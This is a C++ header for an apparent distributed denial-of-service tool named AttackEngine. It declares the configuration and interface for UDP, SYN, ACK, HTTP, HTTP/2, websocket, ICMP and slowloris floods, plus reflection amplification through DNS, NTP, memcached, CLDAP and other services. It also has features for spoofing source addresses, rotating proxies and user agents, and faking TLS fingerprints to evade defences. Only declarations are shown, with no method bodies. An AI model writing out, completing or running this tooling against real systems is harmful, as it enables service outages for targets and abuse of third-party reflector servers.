#ifndef ATTACK_ENGINE_H
#define ATTACK_ENGINE_H

#include <string>
#include <vector>
#include <atomic>
#include <thread>
#include <mutex>
#include <chrono>
#include <cstdint>
#include "ProtocolHandler.h"
#include "ProxyManager.h"
#include "PacketBuilder.h"

class AttackEngine {
public:
    enum class IPVersion { IPv4, IPv6, Both };

    struct Stats {
        long long packets_sent;
        long long bytes_sent;
        long long duration;
        long long current_bps;
        long long peak_bps;
        int       active_threads;
        long long errors;
        long long retries;
    };

    struct AttackConfig {
        std::string target;
        int port = 80;
        std::string method;
        int threads = 100;
        int rate = 1000;
        int packet_size = 1024;
        bool random_source = false;
        bool random_port = false;
        IPVersion ip_version = IPVersion::IPv4;
        bool use_tls = false;
        std::string tls_fingerprint;
        long long packet_limit = 0;
        long long data_limit = 0;
        int duration = 0;
        ProxyManager* proxy_manager = nullptr;
    };

private:
    std::atomic<bool> attack_running{false};
    std::vector<std::thread> attack_threads;
    std::mutex stats_mutex;

    std::atomic<long long> packets_sent{0};
    std::atomic<long long> bytes_sent{0};
    std::atomic<long long> peak_bps{0};
    std::atomic<long long> error_count{0};
    std::atomic<long long> retry_count{0};

    std::atomic<long long> packet_limit{0};
    std::atomic<long long> data_limit{0};
    static inline std::chrono::steady_clock::time_point start_time{};

    std::vector<std::string> user_agents;
    std::vector<std::string> subdomains;
    std::vector<std::string> http2_settings;

    void udp_flood(const std::string& target, int port, int rate, int packet_size,
                   bool random_source, bool random_port, ProxyManager* proxy_manager,
                   IPVersion ip_version);
    void tcp_syn_flood(const std::string& target, int port, int rate,
                       bool random_source, ProxyManager* proxy_manager,
                       IPVersion ip_version);
    void tcp_ack_flood(const std::string& target, int port, int rate,
                       bool random_source, ProxyManager* proxy_manager,
                       IPVersion ip_version);
    void tcp_connect_flood(const std::string& target, int port,
                           ProxyManager* proxy_manager, IPVersion ip_version);
    void http_flood(const std::string& target, int port, int rate,
                    ProxyManager* proxy_manager, IPVersion ip_version);
    void http_post_flood(const std::string& target, int port, int rate,
                         ProxyManager* proxy_manager, IPVersion ip_version);
    void https_flood(const std::string& target, int port,
                     ProxyManager* proxy_manager, IPVersion ip_version);
    void http2_flood(const std::string& target, int port, int rate,
                     ProxyManager* proxy_manager, IPVersion ip_version);
    void websocket_flood(const std::string& target, int port, int rate,
                         ProxyManager* proxy_manager, IPVersion ip_version);
    void icmp_flood(const std::string& target, int rate, int packet_size,
                    IPVersion ip_version);
    void slowloris_attack(const std::string& target, int port, int sockets,
                          ProxyManager* proxy_manager, IPVersion ip_version);
    void dns_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void ntp_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void memcached_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void ssdp_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void snmp_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void mdns_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void cldap_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void chargen_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void qotd_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void rdp_amplification(const std::string& target, int port, int rate, IPVersion ip_version);
    void coap_amplification(const std::string& target, int port, int rate, IPVersion ip_version);

    bool resolve_target(const std::string& target, int port, struct sockaddr_in& addr4,
                        struct sockaddr_in6& addr6, IPVersion ip_version);
    bool resolve_target(const std::string& target, int port, struct sockaddr_in& addr);
    std::string generate_ja3_fingerprint();

public:
    AttackEngine();
    ~AttackEngine();

    void start_attack(const AttackConfig& config);
    void start_attack(const std::string& target, int port, const std::string& method,
                      int threads, int rate, int packet_size,
                      bool random_source, bool random_port,
                      ProxyManager* proxy_manager,
                      long long packet_limit = 10000,
                      long long data_limit = 0);
    void stop_attack();
    bool is_running() const { return attack_running.load(); }

    bool load_user_agents(const std::string& filename);
    bool load_subdomains(const std::string& filename);

    Stats get_stats() const {
        auto now     = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                           now - start_time).count();
        long long pkt  = packets_sent.load();
        long long b    = bytes_sent.load();
        long long cbps = (elapsed > 0) ? (b / elapsed) : 0;
        long long pbps = peak_bps.load();
        long long err  = error_count.load();
        long long ret  = retry_count.load();

        return Stats{pkt, b, elapsed, cbps, pbps,
                     static_cast<int>(attack_threads.size()), err, ret};
    }

    long long get_packets_sent() const { return packets_sent.load(); }
    long long get_bytes_sent()   const { return bytes_sent.load(); }
    long long get_packet_limit() const { return packet_limit.load(); }
    long long get_data_limit()   const { return data_limit.load(); }
    static std::chrono::steady_clock::time_point get_start_time() { return start_time; }

    std::string get_random_user_agent();
    std::string get_random_subdomain();
    std::string get_random_http2_setting();
};

#endif // ATTACK_ENGINE_H
